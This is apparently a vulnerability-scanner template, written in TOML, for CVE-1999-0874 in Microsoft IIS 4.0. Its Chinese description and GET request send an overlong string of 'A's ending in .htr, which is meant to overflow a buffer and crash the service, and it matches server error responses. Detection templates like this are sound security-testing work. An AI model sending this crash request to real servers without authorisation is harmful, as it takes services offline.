[info]
author = "AVE"
description = "检测 Microsoft IIS 4.0 HTR/IDC/STM 文件请求缓冲区溢出漏洞，通过发送超长畸形 .htr 路径请求触发 IIS 服务崩溃"
id = "POC-AVE-1999-1009"
name = "CVE-1999-0874 PoC"
severity = "high"
tags = ["cve-1999-0874"]
vuln_id = [
    "CVE-1999-0874",
    "AVE-1999-1009",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.htr"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Server Error",
    "Service Unavailable",
]
